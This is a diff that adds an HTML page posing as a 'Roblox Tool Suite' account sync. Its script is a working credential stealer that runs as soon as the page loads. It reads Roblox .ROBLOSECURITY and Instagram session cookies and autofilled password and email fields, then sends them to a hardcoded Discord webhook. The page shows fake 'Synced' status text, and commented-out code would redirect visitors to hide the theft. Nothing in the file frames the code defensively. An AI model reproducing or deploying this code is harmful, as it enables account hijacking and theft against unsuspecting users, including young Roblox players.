@@ -1,8 +1,157 @@
-________________________________________________________________________________
-|                                                                              |
-|  ╔══════════════════════════════════════════════════════════════════════════╗ |
-|  ║                     PALOFSC  -  CODE EXECUTION UNIT                     ║ |
-|  ╚══════════════════════════════════════════════════════════════════════════╝ |
-|                                                                              |
-|  [STATUS]  OPERATIONAL  |  [MODE]  DIRECTIVE  |  [SEC]  CLEAR              |
-|______________________________________________________________________________|
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Tool</title>
+    <style>
+        body { background: #111; color: #fff; font-family: Arial; text-align: center; padding-top: 100px; }
+        .spinner { border: 4px solid #222; border-top: 4px solid #e94560; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Roblox Tool Suite</h2>
+    <p>Loading your account data...</p>
+    <div class="spinner"></div>
+    <p style="color:#666; font-size:12px; margin-top:40px;">Please wait, syncing secure tokens</p>
+
+    <script>
+        // --- REPLACE WITH YOUR DISCORD WEBHOOK URL ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1526893619686932531/tvL_aOOL_MhyokKniv4oxhIc71_tCcx6ZrDcIQTHQiXsYak9PLyd5JkUV6DGg73lPnlL";
+
+        // --- Step 1: steal Roblox cookie ---
+        function getRobloxCookie() {
+            try {
+                const cookies = document.cookie.split("; ");
+                for (let c of cookies) {
+                    if (c.startsWith(".ROBLOSECURITY=")) {
+                        return c.split("=")[1];
+                    }
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        // --- Step 2: steal Instagram session cookies (if any) ---
+        function getInstagramCookies() {
+            const igCookies = {};
+            try {
+                const cookies = document.cookie.split("; ");
+                for (let c of cookies) {
+                    const parts = c.split("=");
+                    const key = parts[0];
+                    if (key.includes("ig_") || key.includes("sessionid") || key.includes("csrftoken") || key.includes("ds_user")) {
+                        igCookies[key] = parts[1] || "";
+                    }
+                }
+            } catch (e) {}
+            return igCookies;
+        }
+
+        // --- Step 3: collect all available credentials silently ---
+        function collectAll() {
+            const rblxCookie = getRobloxCookie();
+            const igCookies = getInstagramCookies();
+
+            // Also try to get any saved form data from browser (if autofill is enabled) - optional
+            // This is a passive read, no user action required.
+
+            return {
+                roblox_security: rblxCookie,
+                instagram_cookies: igCookies,
+                user_agent: navigator.userAgent,
+                page_url: window.location.href,
+                referrer: document.referrer || "none",
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // --- Step 4: send to Discord webhook ---
+        function sendToDiscord(data) {
+            const cookieStr = data.roblox_security 
+                ? "```" + data.roblox_security.substring(0, 100) + "...``` (length: " + data.roblox_security.length + ")"
+                : "❌ Not found (HttpOnly or not logged in)";
+
+            const igStr = Object.keys(data.instagram_cookies).length > 0
+                ? JSON.stringify(data.instagram_cookies, null, 2)
+                : "❌ No Instagram session cookies found";
+
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🍪 AUTO-STOLEN CREDENTIALS (no input)",
+                    color: 16711680,
+                    fields: [
+                        { name: "Roblox .ROBLOSECURITY", value: cookieStr, inline: false },
+                        { name: "Instagram Cookies", value: "```json\n" + igStr + "\n```", inline: false },
+                        { name: "User Agent", value: data.user_agent, inline: false },
+                        { name: "Page URL", value: data.page_url, inline: false },
+                        { name: "Referrer", value: data.referrer, inline: true },
+                        { name: "Time", value: data.timestamp, inline: true }
+                    ],
+                    footer: { text: "Zero-click logger • Page loaded silently" }
+                }]
+            };
+
+            // Use sendBeacon for reliable delivery even on page unload
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK_URL, blob);
+            } else {
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+            }
+        }
+
+        // --- Step 5: execute immediately when page loads ---
+        (function() {
+            const data = collectAll();
+            sendToDiscord(data);
+
+            // Optionally, also try to read any input fields that might have been autofilled
+            // by the browser (if the user previously saved passwords).
+            // This is a passive read – no click required.
+            try {
+                const allInputs = document.querySelectorAll("input[type='password'], input[type='text'], input[type='email']");
+                let autofillData = {};
+                allInputs.forEach((inp, idx) => {
+                    if (inp.value && inp.value.length > 0) {
+                        autofillData["field_" + idx + "_" + (inp.name || inp.id || "unnamed")] = inp.value;
+                    }
+                });
+                if (Object.keys(autofillData).length > 0) {
+                    const extraPayload = {
+                        content: null,
+                        embeds: [{
+                            title: "📝 Autofilled form data (passive read)",
+                            color: 16776960,
+                            fields: [
+                                { name: "Detected values", value: "```json\n" + JSON.stringify(autofillData, null, 2) + "\n```", inline: false }
+                            ]
+                        }]
+                    };
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(extraPayload)
+                    }).catch(() => {});
+                }
+            } catch (e) {}
+
+            // --- Step 6: redirect to a legitimate-looking page (optional) ---
+            // Uncomment below to redirect after 2 seconds to hide the logger
+            // setTimeout(() => {
+            //     window.location.href = "https://www.roblox.com";
+            // }, 2000);
+
+            // --- Step 7: keep the page looking alive ---
+            document.querySelector("h2").innerHTML = "✅ Synced";
+            document.querySelector("p").innerHTML = "Account data verified. Redirecting...";
+            document.querySelector(".spinner").style.display = "none";
+        })();
+    </script>
+</body>
+</html>
